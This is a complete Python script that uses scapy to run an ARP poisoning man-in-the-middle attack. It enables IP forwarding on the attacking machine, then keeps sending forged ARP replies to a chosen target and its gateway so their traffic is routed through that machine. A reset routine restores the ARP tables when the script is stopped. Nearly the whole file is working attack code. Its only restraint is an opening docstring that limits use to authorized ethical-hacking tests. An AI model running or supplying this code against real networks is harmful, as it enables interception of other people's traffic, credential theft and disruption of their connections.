"""
This code performs an ARP spoofing (or ARP poisoning) attack to intercept the traffic between 
the target system and the gateway. However, due to ethical and legal responsibilities, this code
should only be used in authorized testing environments and for ethical hacking purposes. 
Unauthorized use on real networks is illegal.
"""

import subprocess
import scapy.all as scapy
import time
import optparse

# Enables IP forwarding on the attacker's machine
def ip_forward():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell = True)
    print("Ip forward value is 1!!\n")

# Retrieves the MAC address of a given IP by sending an ARP request
def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)  # Create ARP request packet for the IP
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet frame to broadcast
    combined_packet = broadcast_packet / arp_request_packet  # Combine both packets
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]  # Send packet and receive response

    return answered_list[0][1].hwsrc  # Return the MAC address from the response

# Sends a spoofed ARP response to the target, poisoning its ARP table
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)  # Get MAC address of the target

    ether = scapy.Ether(dst=target_mac)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)

    packet = ether / arp_response  # Combine Ethernet and ARP layers
    scapy.sendp(packet, verbose=False)  # Send the spoofed packet

# Sends correct ARP responses to restore original ARP mappings after attack
def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)  # Get MAC address of the victim
    gateway_mac = get_mac_address(gateway_ip)  # Get MAC address of the gateway

    ether = scapy.Ether(dst=fooled_mac)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)

    packet = ether / arp_response
    scapy.sendp(packet, verbose=False, count=6)  # Send the packet multiple times to ensure it is received

# Parses command-line arguments to get target and gateway IPs
def get_user_input():
    prs = optparse.OptionParser()

    prs.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    prs.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = prs.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")

    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options

# Main program
number = 0
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    ip_forward()  # Enable IP forwarding
    while True:
        # Continuously poison ARP tables of both target and gateway
        arp_poisoning(user_target_ip, user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)
        number += 2
        print(f"\r - Sending Packets: {number}", end = "")
        time.sleep(3)

except KeyboardInterrupt:
    # Stop the attack and restore the network
    print("\n - Program was terminated by the user.")
    reset_operation(user_target_ip, user_gateway_ip)
    reset_operation(user_gateway_ip, user_target_ip)
